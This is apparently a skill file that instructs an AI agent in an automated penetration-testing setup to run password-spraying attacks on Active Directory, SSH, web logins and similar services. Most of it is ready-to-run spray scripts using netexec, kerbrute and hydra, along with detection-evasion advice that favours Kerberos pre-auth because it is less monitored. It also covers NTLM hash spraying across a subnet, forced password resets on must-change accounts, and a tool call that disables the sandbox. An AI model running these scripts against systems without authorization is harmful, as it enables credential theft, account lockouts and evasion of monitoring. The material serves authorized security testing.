---
name: password-spraying
description: >
  Performs password spraying against authentication services with lockout-safe
  techniques. Works against AD (SMB/Kerberos/LDAP), SSH, web login forms, OWA,
  and any service with username/password auth. Service-agnostic — the
  orchestrator passes target services and spray intensity tier.
keywords:
  - password spray
  - spray passwords
  - domain spray
  - brute force domain
  - find valid credentials
  - lockout policy
  - kerbrute spray
  - credential guessing
  - smb spray
  - winrm spray
  - ssh spray
  - mssql spray
  - mysql spray
  - web login spray
  - hydra
  - nxc spray
tools:
  - kerbrute
  - netexec
  - hydra
  - SpearSpray
  - DomainPasswordSpray
  - spray.sh
opsec: high
---

# Password Spraying

You are helping a penetration tester perform password spraying against
authentication services. All testing is under explicit written authorization.

**OPSEC Exception**: This skill tests credentials directly against the domain.
The Kerberos-first authentication convention does not apply here — spraying IS
the authentication attempt. However, Kerberos pre-auth spraying (kerbrute,
SpearSpray) is preferred over NTLM spraying because it generates Event 4771
instead of 4625, which is less commonly monitored.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[password-spraying] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Username list (from RID cycling, kerbrute, LDAP, or BloodHound)
- Network access to DC (port 88 for Kerberos, 445 for SMB, 389 for LDAP)
- Tools: `kerbrute`, `netexec` (nxc), optionally `SpearSpray`,
  `DomainPasswordSpray`, `spray.sh`

**WARNING**: Always enumerate password policy before spraying. Spraying without
knowing the lockout threshold risks locking out accounts.

## Step 1: Enumerate Password Policy

### From Linux (Unauthenticated)

**Primary — LDAP anonymous query** (most reliable, returns structured data):

```bash
# Query lockout + password attributes from domain root object
ldapsearch -x -H ldap://DC01.DOMAIN.LOCAL -b "DC=DOMAIN,DC=LOCAL" -s base \
  '(objectClass=*)' lockoutThreshold lockOutObservationWindow \
  lockoutDuration minPwdLength pwdProperties
```

Returns integer values directly:
- `lockoutThreshold: 0` = no lockout (spray freely)
- `lockoutThreshold: 5` = 5 attempts before lockout
- Duration/window values are negative 100ns intervals — divide abs(value) by
  600,000,000 to get minutes (e.g., `-18000000000` = 30 minutes)

Requires anonymous LDAP bind (common on misconfigured DCs).

**Secondary — NetExec SAMR query** (human-readable output):

```bash
nxc smb DC01.DOMAIN.LOCAL -u '' -p '' --pass-pol
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --pass-pol
```

Look for "Account Lockout Threshold" in the output. "None" = 0 = no lockout.

**Tertiary — enum4linux-ng** (modern Python rewrite of enum4linux):

```bash
enum4linux-ng -P DC01.DOMAIN.LOCAL
```

**Note on rpcclient:** `rpcclient -c "getdompwinfo"` returns min password
length and password properties only — it does NOT return lockout threshold,
observation window, or lockout duration. Do not rely on it for lockout policy.

### From Linux (Authenticated)

```bash
# NetExec with valid creds
nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --pass-pol

# With Kerberos
nxc smb DC01.DOMAIN.LOCAL --use-kcache --pass-pol
```

### From Windows

```powershell
# Built-in
net accounts /domain

# PowerView
(Get-DomainPolicy)."SystemAccess"
```

### Key Values to Record

| Policy Setting | What to Record |
|---------------|----------------|
| Lockout threshold | Max failed attempts before lockout (0 = no lockout) |
| Observation window | Time window for counting failures (minutes) |
| Lockout duration | How long accounts stay locked (minutes) |
| Min password length | Informs password list generation |
| Complexity requirements | Whether special chars/numbers are required |
| Password history | Number of previous passwords remembered |

**Critical**: If lockout threshold is 0, there is no lockout — spray freely.
If threshold is low (1-3), extreme caution is needed.

### Fine-Grained Password Policies (PSOs)

Different groups may have different lockout thresholds. SpearSpray handles
this automatically. To check manually:

```bash
# bloodyAD
bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
  get search --filter '(objectClass=msDS-PasswordSettings)' \
  --attr cn,msDS-LockoutThreshold,msDS-LockoutObservationWindow

# PowerView
Get-DomainFineGrainedPasswordPolicy
```

## Step 2: Verify Usernames

The orchestrator passes usernames in the agent prompt. Write them to
`engagement/evidence/usernames.txt` as described in the File-Based Spray
Model section above.

If the orchestrator did NOT provide usernames and you need to enumerate:

```bash
# RID cycling (unauthenticated)
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --rid-brute 10000 \
  | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > engagement/evidence/usernames.txt

# kerbrute user enumeration (Kerberos — stealthier, generates 4771)
kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## File-Based Spray Model

**All spraying uses wordlist files. Never pass passwords inline to tools.**

The agent creates files in `engagement/evidence/` before spraying. This
ensures reproducibility, prevents shell escaping bugs, and lets the operator
review what will be tested.

### Files to Create

| File | Contents | When |
|------|----------|------|
| `engagement/evidence/usernames.txt` | One username per line | Always, from orchestrator-provided list |
| `engagement/evidence/wordlist.txt` | Agent-generated context passwords (domain/hostname/season — NOT usernames) | Always, before first spray round |
| (SecLists path) | External wordlist, referenced by path | All tiers (size varies by tier) |

### wordlist.txt — Agent-Generated Context Passwords

Build `wordlist.txt` from known engagement context. These are the ONLY
passwords the agent may generate. **Do NOT invent, guess, or improvise
passwords beyond these patterns.**

**Do NOT include usernames in wordlist.txt.** Username-as-password is handled
in Round 1 by passing `usernames.txt` as both the user and password file.
Adding usernames to wordlist.txt would redundantly re-test them in Round 2.

**Patterns to include (substitute real values from context):**

```bash
cat > engagement/evidence/wordlist.txt << 'WORDLIST'
# === Domain/hostname/company name derivatives ===
{DomainName}1!
{domainname}1!
{DomainName}123
{domainname}123
{Hostname}1!
{hostname}1!
{Hostname}123
{hostname}123

# === Season + year (current + previous, generate dynamically) ===
Winter2026!
Spring2026!
Autumn2025!
Summer2025!
Winter2025!
Spring2025!
WORDLIST
```

Replace `{DomainName}` and `{Hostname}` with actual values (e.g., `Megabank`,
`Monteverde`). Use both the short name and FQDN where they differ.

**That is the complete list.** Do not add `Password1`, `Welcome1`, or other
generic passwords — those come from the SecLists file. Do not add creative
guesses like `azure_123!` or `Demo123!`. The purpose of `wordlist.txt` is
context-specific passwords that no generic wordlist would contain.

### usernames.txt

Write the usernames from the orchestrator prompt, one per line:

```bash
cat > engagement/evidence/usernames.txt << 'USERS'
<usernames from orchestrator prompt, one per line>
USERS
```

## Spray Intensity Tiers

The orchestrator passes a spray intensity tier and target services in the
agent prompt. Check for them and build the spray plan accordingly. If no tier
is specified, default to **light**.

**Every tier sprays the same wordlist.txt. Tiers differ only in which
SecLists file is appended.**

### Light Spray

1. Username-as-password round (special handling — see Spray Execution below)
2. `engagement/evidence/wordlist.txt` (agent-generated context passwords)
3. `/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` (~500 passwords)

### Medium Spray

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` (~10k passwords)

### Heavy Spray

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt` (~100k passwords)

### Custom Wordlist

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. Operator-provided wordlist path

## HTTP Form Calibration (Web Login Only)

Before spraying a web login form, calibrate success/failure detection:

1. **Register a test account** (or use one the orchestrator provides)
2. **Establish baseline responses** — login with known-valid and known-bad creds:
   ```bash
   # Known-bad baseline
   curl -s -o /dev/null -w '%{http_code} %{size_download}' \
     -X POST http://TARGET/login -d 'user=INVALID&pass=INVALID'
   # Known-good baseline
   curl -s -o /dev/null -w '%{http_code} %{size_download}' \
     -X POST http://TARGET/login -d 'user=TESTUSER&pass=TESTPASS'
   ```
3. **Identify the success indicator** — status code diff, body size diff,
   redirect URL, Set-Cookie header, or specific string in response body
4. **Build the hydra form string** from observed behavior:
   ```bash
   # F= string must match FAILURE response, not success
   hydra -L users.txt -P pass.txt TARGET http-post-form \
     "/login:user=^USER^&pass=^PASS^:F=<failure-indicator>" -u -t 4
   ```

**If you cannot establish a reliable success/failure indicator, report the
limitation and return.** Do not spray with unreliable detection — it produces
false positives that waste downstream agent time.

## Spray Execution — Script-Based

**Generate a self-contained spray script, then execute it in one shot.**

The Bash tool defaults to a 2-minute timeout, but supports up to 10 minutes
via `timeout=600000`. Large spray rounds may exceed even this — for those,
use `run_in_background=true` and check the output later.

**The fix:** Generate a bash script with all spray rounds baked in, then execute
it via Bash with extended timeout. The script runs all rounds sequentially
within one process, outputs structured results, and exits.

### Step 1: Generate the Spray Script

Write `engagement/evidence/spray-runner.sh` using the Write tool. The script
takes no arguments — all values are embedded from the context the orchestrator
provided.

```bash
#!/usr/bin/env bash
set -euo pipefail

# === Configuration (agent fills these from orchestrator context) ===
TARGET="TARGET_IP"
DOMAIN="DOMAIN.LOCAL"
USERFILE="engagement/evidence/usernames.txt"
WORDLIST="engagement/evidence/wordlist.txt"
RESULTS="engagement/evidence/spray-results.txt"

# SecLists file (tier-dependent)
# Light:  /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
# Medium: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
# Heavy:  /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
SECLISTS_FILE="SECLISTS_PATH"

# Services to spray (from operator selection)
SERVICES=(smb)  # e.g., (smb winrm ldap ssh mssql rdp)

# === Spray Execution ===
> "$RESULTS"  # truncate results file

for svc in "${SERVICES[@]}"; do
    echo "========================================" | tee -a "$RESULTS"
    echo "[*] Service: $svc" | tee -a "$RESULTS"
    echo "========================================" | tee -a "$RESULTS"

    # Round 1: Username-as-password
    echo "[*] Round 1: username-as-password" | tee -a "$RESULTS"
    nxc "$svc" "$TARGET" -u "$USERFILE" -p "$USERFILE" \
        --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
    echo "" | tee -a "$RESULTS"

    # Round 2: Context wordlist
    echo "[*] Round 2: context wordlist" | tee -a "$RESULTS"
    nxc "$svc" "$TARGET" -u "$USERFILE" -p "$WORDLIST" \
        --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
    echo "" | tee -a "$RESULTS"

    # Round 3: SecLists wordlist
    if [[ -f "$SECLISTS_FILE" ]]; then
        echo "[*] Round 3: SecLists ($SECLISTS_FILE)" | tee -a "$RESULTS"
        nxc "$svc" "$TARGET" -u "$USERFILE" -p "$SECLISTS_FILE" \
            --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
        echo "" | tee -a "$RESULTS"
    else
        echo "[!] SecLists file not found: $SECLISTS_FILE" | tee -a "$RESULTS"
    fi
done

echo "========================================" | tee -a "$RESULTS"
echo "[*] Spray complete" | tee -a "$RESULTS"

# Extract hits (lines containing [+] or "Pwn3d")
echo "" | tee -a "$RESULTS"
echo "=== VALID CREDENTIALS ===" | tee -a "$RESULTS"
grep -E '(\[\+\]|Pwn3d)' "$RESULTS" 2>/dev/null || echo "(none found)" | tee -a "$RESULTS"
```

**Agent responsibilities when generating the script:**

1. Replace `TARGET_IP`, `DOMAIN.LOCAL`, and `SECLISTS_PATH` with real values
2. Set the `SERVICES` array to match operator-selected services
3. For hydra-only protocols (FTP, HTTP POST form), add hydra commands instead
   of nxc (see Service Protocol Commands below)
4. Write the script via the Write tool, then `chmod +x`

### Step 2: Execute via Bash

Run the script with an extended timeout (10 minutes). Spray scripts are
non-interactive batch jobs — they run and exit. Use Bash, not `start_process`:

```
Bash(command="bash engagement/evidence/spray-runner.sh", timeout=600000, dangerouslyDisableSandbox=true)
```

If the spray may exceed 10 minutes (very large user lists or many services),
use `run_in_background=true` and check the output later via `TaskOutput`.

### Step 3: Parse Results

After the script completes:

1. Read `engagement/evidence/spray-results.txt` for the full output
2. Extract valid credentials from the `=== VALID CREDENTIALS ===` section
3. Close the session: `close_session(session_id=..., save_transcript=true)`
4. Include all findings in your return summary

### Spray Rounds Reference

The script above embeds three rounds per service. For reference, the rounds are:

**Round 1: Username-as-password** — usernames file as both user and password
list (N×N attempts). Catches users who set another user's name as password.

**Round 2: Context wordlist** — `engagement/evidence/wordlist.txt` with
domain/hostname/seasonal derivatives (see wordlist.txt section above).

**Round 3: SecLists** — tier-dependent external wordlist (500/10k/100k
passwords).

### Service Protocol Commands

Use `nxc` (netexec) for all supported protocols. Only fall back to `hydra`
for protocols netexec does not support, or `kerbrute` for Kerberos-only
environments (see NTLM-Disabled Environments below).

```bash
# SMB (most common)
nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN

# LDAP
nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success

# WinRM (if 5985/5986 open)
nxc winrm TARGET -u USERFILE -p PASSFILE --continue-on-success

# RDP
nxc rdp TARGET -u USERFILE -p PASSFILE --continue-on-success

# MSSQL
nxc mssql TARGET -u USERFILE -p PASSFILE --continue-on-success

# SSH
nxc ssh TARGET -u USERFILE -p PASSFILE --continue-on-success

# FTP (hydra — nxc does not support FTP)
hydra -L USERFILE -P PASSFILE ftp://TARGET -u -t 4 -o spray-ftp.log

# HTTP POST form (hydra — adjust form params and failure string)
hydra -L USERFILE -P PASSFILE TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -u -t 4 -o spray-web.log
```

**Critical flags:**
- `--continue-on-success` — don't stop at first valid credential.
- `-d DOMAIN` — for domain-joined services (SMB, WinRM). Omit for local auth.

**Do NOT use `--no-bruteforce`** for spray rounds. Despite its name,
`--no-bruteforce` does line-by-line matching (user1:pass1, user2:pass2) — if
the password file is longer than the user file, extra passwords are silently
skipped. Without it, nxc tests all combinations (every password against every
user), which is what spray mode requires. Use lockout-aware pacing (below)
to stay safe.

### NTLM-Disabled Environments

When NTLM is disabled (STATUS_NOT_SUPPORTED on SMB/LDAP auth), the default
nxc spray script will fail. Two options:

**Option A — nxc with Kerberos (preferred, simpler):**

Add `--kerberos` to all nxc commands in the spray script. nxc handles
Kerberos authentication natively — no script restructuring needed:

```bash
nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN --kerberos
nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success --kerberos
```

This is a drop-in flag — the spray script template works as-is with this
addition. Use this approach when the operator selected nxc-compatible
services (SMB, LDAP, WinRM).

**Option B — kerbrute loop (Kerberos pre-auth, stealthier):**

Use the kerbrute spray script variant (see below). Generates Event 4771
instead of 4625. Use when OPSEC matters or when nxc Kerberos auth fails.

**Detection:** If the orchestrator context mentions NTLM disabled, Kerberos-
only, or STATUS_NOT_SUPPORTED, you MUST use one of these approaches. Do not
attempt standard nxc commands without `--kerberos` — they will silently fail.

## Lockout-Aware Spray Pacing

If the lockout policy has a non-zero threshold, pace the spray to avoid
lockouts:

```
safe_attempts = lockout_threshold - 2  # leave buffer
wait_time = observation_window + 1 minute  # wait for counter reset
```

Example: threshold=5, window=30min → spray 3 passwords per user, wait 31
minutes, resume. The builtin **Administrator (RID 500) cannot be locked out**
regardless of policy — always safe to spray.

If you have authenticated access, check current badPwdCount per user before
spraying to identify accounts already close to lockout:
```bash
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users
```

## OPSEC: Kerberos vs NTLM Spraying

| Protocol | Detection Event | Commonly Monitored? |
|----------|----------------|---------------------|
| Kerberos pre-auth (kerbrute) | 4771 (pre-auth failure) | Less commonly |
| SMB/NTLM (netexec) | 4625 (logon failure) | Yes, standard SIEM rule |
| LDAP (netexec) | 4625 (logon failure) | Yes |

For OPSEC-sensitive engagements where detection matters, use kerbrute for
Kerberos pre-auth spraying instead of netexec SMB/LDAP. For CTF/HTB or
engagements where OPSEC is not a concern, netexec is simpler and preferred.

### kerbrute (Kerberos Pre-Auth)

**CRITICAL: `kerbrute passwordspray` takes a SINGLE password string, NOT a
wordlist file.** Passing a file path as the password argument will literally
test the file path string as the password (e.g., trying the password
`/home/user/wordlist.txt` against all users). This is silent, wrong, and
wastes the entire spray.

Single password usage:
```bash
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  users.txt 'Spring2026!' -v
```

**To spray a wordlist with kerbrute, loop through it:**

```bash
while IFS= read -r pass || [[ -n "$pass" ]]; do
    [[ -z "$pass" || "$pass" == \#* ]] && continue
    kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
      users.txt "$pass" 2>&1 | tee -a spray-results.txt
done < wordlist.txt
```

#### Kerbrute Spray Script Variant

When using kerbrute instead of nxc (NTLM-disabled environments or OPSEC-
sensitive engagements), generate this spray script variant:

```bash
#!/usr/bin/env bash
set -euo pipefail

# === Configuration (agent fills these from orchestrator context) ===
TARGET_DC="DC01.DOMAIN.LOCAL"
DOMAIN="DOMAIN.LOCAL"
USERFILE="engagement/evidence/usernames.txt"
WORDLIST="engagement/evidence/wordlist.txt"
RESULTS="engagement/evidence/spray-results.txt"
SECLISTS_FILE="SECLISTS_PATH"

# === Helper: spray one password against all users ===
spray_one() {
    local pass="$1"
    kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET_DC" \
      "$USERFILE" "$pass" 2>&1
}

# === Spray Execution ===
> "$RESULTS"

echo "========================================" | tee -a "$RESULTS"
echo "[*] Kerbrute spray — $(wc -l < "$USERFILE") users" | tee -a "$RESULTS"
echo "========================================" | tee -a "$RESULTS"

# Round 1: Username-as-password
echo "[*] Round 1: username-as-password" | tee -a "$RESULTS"
while IFS= read -r user || [[ -n "$user" ]]; do
    [[ -z "$user" ]] && continue
    spray_one "$user" | tee -a "$RESULTS"
done < "$USERFILE"
echo "" | tee -a "$RESULTS"

# Round 2: Context wordlist
echo "[*] Round 2: context wordlist ($(wc -l < "$WORDLIST") passwords)" | tee -a "$RESULTS"
while IFS= read -r pass || [[ -n "$pass" ]]; do
    [[ -z "$pass" || "$pass" == \#* ]] && continue
    spray_one "$pass" | tee -a "$RESULTS"
done < "$WORDLIST"
echo "" | tee -a "$RESULTS"

# Round 3: SecLists wordlist
if [[ -f "$SECLISTS_FILE" ]]; then
    total=$(wc -l < "$SECLISTS_FILE")
    echo "[*] Round 3: SecLists ($total passwords)" | tee -a "$RESULTS"
    count=0
    while IFS= read -r pass || [[ -n "$pass" ]]; do
        [[ -z "$pass" || "$pass" == \#* ]] && continue
        spray_one "$pass" | tee -a "$RESULTS"
        count=$((count + 1))
        if (( count % 100 == 0 )); then
            echo "[*] Progress: $count / $total" | tee -a "$RESULTS"
        fi
    done < "$SECLISTS_FILE"
    echo "" | tee -a "$RESULTS"
else
    echo "[!] SecLists file not found: $SECLISTS_FILE" | tee -a "$RESULTS"
fi

echo "========================================" | tee -a "$RESULTS"
echo "[*] Spray complete" | tee -a "$RESULTS"
echo "" | tee -a "$RESULTS"
echo "=== VALID CREDENTIALS ===" | tee -a "$RESULTS"
grep -i 'valid pass' "$RESULTS" 2>/dev/null || echo "(none found)" | tee -a "$RESULTS"
```

**When to use this variant instead of the nxc script:**
- NTLM disabled and `nxc --kerberos` fails or is unavailable
- OPSEC-sensitive engagement (generates 4771 instead of 4625)
- Operator explicitly requests kerbrute

**Execute the same way** — write via Write tool, `chmod +x`, run via
Bash with `timeout=600000`.

### Hash Spray (Lateral Movement)

When you have a recovered NTLM hash, spray it across targets:
```bash
nxc smb 10.10.10.0/24 -u 'Administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \
  --local-auth | grep "Pwn3d"
```

## Step 3: Validate and Exploit Hits

### Credential Verification (Mandatory Before State Writes)

**Every hit must be double-verified before calling `add_credential()`.** Spray
tools produce false positives from redirect chains, WAF interference, and
inconsistent response parsing. Re-test each hit individually:

```bash
# Re-test with curl (HTTP login) — compare response to known-bad baseline
curl -s -o /dev/null -w '%{http_code} %{size_download} %{redirect_url}' \
  -X POST http://TARGET/login -d 'user=HITUSER&pass=HITPASS'

# Re-test with nxc (AD/SSH/SMB) — single credential, verbose
nxc SERVICE TARGET -u 'HITUSER' -p 'HITPASS' -d DOMAIN 2>&1
```

Only call `add_credential()` when the re-test confirms access. If re-test
fails, discard the hit and note it as a false positive in your return summary.

### Verify Access Level

**Pwn3d! means different things per protocol.** Report the correct privilege:

| Protocol | Pwn3d! means | Privilege to report |
|----------|-------------|---------------------|
| SMB | Local admin (can write to ADMIN$) | `admin` |
| WinRM | Can connect (Remote Management Users) | `user` |
| RDP | Can log in (Remote Desktop Users) | `user` |
| MSSQL | Can authenticate | `user` |
| LDAP | Can bind | `user` |

Only SMB Pwn3d! confirms local admin. WinRM Pwn3d! does NOT mean admin — it
means the user is in Remote Management Users or equivalent. Do not report
`privilege: admin` from WinRM Pwn3d! alone.

```bash
# Check SMB access — Pwn3d! here = local admin
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL

# Check shares
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --shares

# Check WinRM access — Pwn3d! here = can connect, NOT admin
nxc winrm DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL -x "whoami"

# Check RDP access
nxc rdp DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL
```

### Empty Password / Must-Change Technique

Spray empty passwords to find accounts with expired/must-change passwords:

```bash
# Spray empty password
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p '' --continue-on-success

# STATUS_PASSWORD_MUST_CHANGE = expired password
# Change it via SAMR (no old password needed for must-change accounts):
NEWPASS='P@ssw0rd!2025#'
nxc smb DC01.DOMAIN.LOCAL -u 'target_user' -p '' \
  -M change-password -o NEWPASS="$NEWPASS"
```

### Get Domain Password Policy (Post-Auth)

```bash
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --pass-pol
```

## Step 4: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### Account Lockouts

- **Immediate response**: Stop all spray operations
- **Check**: Re-query password policy — you may have hit a Fine-Grained
  Password Policy with a lower threshold
- **Recovery**: Lockout duration is typically 30 minutes. Wait and resume
  with fewer attempts per round

### KRB_AP_ERR_SKEW (Clock Skew — kerbrute path only)

Kerberos requires clocks within 5 minutes of the DC. This applies to the
kerbrute-based spraying path, not NTLM-based spraying. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### No Lockout Threshold (0)

If lockout threshold is 0, there is no lockout protection. You can spray
aggressively, but still prefer Kerberos pre-auth for detection avoidance.

### Valid Creds but ACCESS_DENIED

- Account may be disabled, expired, or restricted to specific workstations
- Check `userAccountControl` flags via LDAP
- Try different protocols (SMB may fail but WinRM may work, or vice versa)
- Try local authentication: `nxc smb TARGET -u user -p pass --local-auth`
